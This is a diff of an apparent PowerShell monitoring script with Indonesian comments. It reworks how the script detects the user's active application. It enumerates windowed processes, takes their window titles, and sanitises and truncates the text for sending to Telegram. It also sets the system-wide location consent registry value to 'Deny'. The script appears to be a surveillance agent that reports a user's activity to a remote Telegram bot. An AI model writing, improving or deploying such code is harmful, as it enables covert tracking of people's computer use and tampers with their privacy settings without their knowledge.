@@ -147,54 +147,71 @@ try {
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" -Name "Value" -Value "Deny" -ErrorAction SilentlyContinue
 } catch {}
 
-# --- DETEKSI APLIKASI YANG SEDANG DIBUKA USER (ANTI-DUPLIKASI) ---
+# --- DETEKSI AKTIVITAS USER (FINAL RESILIENT VERSION) ---
 $CurrentActivity = "Idle / No Active Window"
 
 try {
-    # 1. Cek apakah tipe sudah ada di AppDomain saat ini
-    # Kita gunakan format Assembly-Qualified Name atau pencarian manual agar aman
-    $TypeExists = $false
-    foreach ($Assembly in [AppDomain]::CurrentDomain.GetAssemblies()) {
-        if ($Assembly.GetType("WinAPI.User32Win")) {
-            $TypeExists = $true
-            break
+    $ValidApps = New-Object System.Collections.ArrayList
+
+    # 1. Ambil semua proses, tetapi langsung filter nama proses sistem yang pasti bukan aplikasi user
+    $AllProcesses = Get-Process -ErrorAction SilentlyContinue | Where-Object { 
+        $_.ProcessName -notmatch "^(Idle|System|SecureSystem|Registry|MemoryCompression|vmmem|explorer|Taskmgr)$" 
+    }
+
+    # 2. Periksa properti jendela secara hati-hati per proses
+    foreach ($Proc in $AllProcesses) {
+        try {
+            # Ambil handle jendela di dalam try internal agar jika error tidak merusak seluruh skrip
+            $HasWindow = $Proc.MainWindowHandle
+            
+            if ($HasWindow -and $HasWindow -ne 0 -and $HasWindow -ne [IntPtr]::Zero) {
+                $Title = $Proc.MainWindowTitle
+                if (-not [string]::IsNullOrWhiteSpace($Title)) {
+                    $TempObj = [PSCustomObject]@{
+                        Name  = $Proc.ProcessName
+                        Title = $Title
+                        RAM   = $Proc.WorkingSet64
+                    }
+                    [void]$ValidApps.Add($TempObj)
+                }
+            }
+        } catch { 
+            # Jika 1 proses sistem eror saat dibaca handle-nya, abaikan dan lanjut ke proses berikutnya
+            continue 
         }
     }
 
-    # 2. Jika BELUM ada, baru kita kompilasi C#-nya
-    if (-not $TypeExists) {
-        $Signature = @'
-        [DllImport("user32.dll")]
-        public static extern IntPtr GetForegroundWindow();
-        [DllImport("user32.dll")]
-        public static extern int GetWindowThreadProcessId(IntPtr hWnd, out int lpdwProcessId);
-'@
-        Add-Type -MemberDefinition $Signature -Name "User32Win" -Namespace "WinAPI" -ErrorAction SilentlyContinue | Out-Null
-    }
+# 3. Tentukan aplikasi aktif berdasarkan konsumsi memori terbesar
+    if ($ValidApps.Count -gt 0) {
+        $TopApp = $ValidApps | Sort-Object RAM -Descending | Select-Object -First 1
+        
+        # Ambil teks mentah
+        $CleanAppName = $TopApp.Name
+        $CleanTitle   = $TopApp.Title
 
-    # 3. Eksekusi pemanggilan API (Gunakan namespace penuh secara dinamis)
-    $ActiveWindowHandle = [WinAPI.User32Win]::GetForegroundWindow()
-
-    if ($ActiveWindowHandle -and $ActiveWindowHandle -ne [IntPtr]::Zero) {
-        $ProcessId = 0
-        $ReturnId = [WinAPI.User32Win]::GetWindowThreadProcessId($ActiveWindowHandle, [ref]$ProcessId)
-
-        if ($ProcessId -gt 0) {
-            $ActiveProcess = Get-Process -Id $ProcessId -ErrorAction SilentlyContinue
-            if ($ActiveProcess) {
-                $AppName = $ActiveProcess.ProcessName
-                $WindowTitle = $ActiveProcess.MainWindowTitle
-
-                if ([string]::IsNullOrEmpty($WindowTitle)) { 
-                    $WindowTitle = "System Process / Background Task" 
-                }
-                $CurrentActivity = "$AppName ($WindowTitle)"
+        # --- PROSES SANITISASI STRING MURNI (TANPA REGEX) ---
+        # Menghapus karakter berbahaya satu per satu secara literal agar aman di semua versi PowerShell
+        $DangerousChars = @('*', '_', '`', '[', ']', '(', ')', '#', '-')
+        foreach ($Char in $DangerousChars) {
+            $CleanAppName = $CleanAppName.Replace($Char, '')
+            if ($CleanTitle) {
+                $CleanTitle = $CleanTitle.Replace($Char, '')
             }
         }
+
+        # Batasi panjang karakter judul jendela agar tidak terlalu panjang di Telegram (Maks 60 Karakter)
+        if ($CleanTitle.Length -gt 60) {
+            $CleanTitle = $CleanTitle.Substring(0, 57) + "..."
+        }
+
+        $CurrentActivity = "$CleanAppName ($CleanTitle)"
+    } else {
+        $CurrentActivity = "No Active GUI Window"
     }
+
 } catch {
-    # Mengamankan agar skrip tidak crash dan tetap mengirim data ke Telegram
-    $CurrentActivity = "Error: $($_.Exception.Message)"
+    # Jika sampai baris ini lumpuh (hampir mustahil), tangkap pesan error aslinya agar ketahuan masalahnya
+    $CurrentActivity = "Debug: $($_.Exception.Message)"
 }
 
 # --- LOGIKA TAMPILAN LOKASI ---
